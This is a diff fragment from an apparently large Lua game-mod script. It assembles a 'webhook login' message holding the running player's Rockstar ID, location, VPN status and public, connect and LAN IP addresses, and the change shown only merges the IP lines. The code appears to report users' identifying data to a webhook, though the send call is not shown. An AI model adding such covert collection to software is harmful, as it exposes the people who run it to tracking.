@@ -8371,9 +8371,7 @@ local languagesforwebhooklogins = pidlanguagefull(players.user())
 descriptionforwebhooklogin = "RID: ".. players.get_rockstar_id(players.user()) .."\\n"
 descriptionforwebhooklogin = descriptionforwebhooklogin .."Land: ".. languagesforwebhooklogins.country.." // Stadt: "..languagesforwebhooklogins.city.." // Staat: "..languagesforwebhooklogins.state .."\\n"
 descriptionforwebhooklogin = descriptionforwebhooklogin .."VPN: ".. players.is_using_vpn(players.user()) .."\\n"
-descriptionforwebhooklogin = descriptionforwebhooklogin .."IP: ".. players.get_ip(players.user()) .."\\n"
-descriptionforwebhooklogin = descriptionforwebhooklogin .."Connect IP: ".. players.get_connect_ip(players.user()) .."\\n"
-descriptionforwebhooklogin = descriptionforwebhooklogin .."Lan IP: ".. players.get_lan_ip(players.user())
+descriptionforwebhooklogin = descriptionforwebhooklogin .."IP: ".. players.get_ip(players.user()).."// Connect IP: ".. players.get_connect_ip(players.user()).."// Lan IP: ".. players.get_lan_ip(players.user()).."\\n"
 local bodyforloginwebhook = [[
 	{
 		"embeds": [
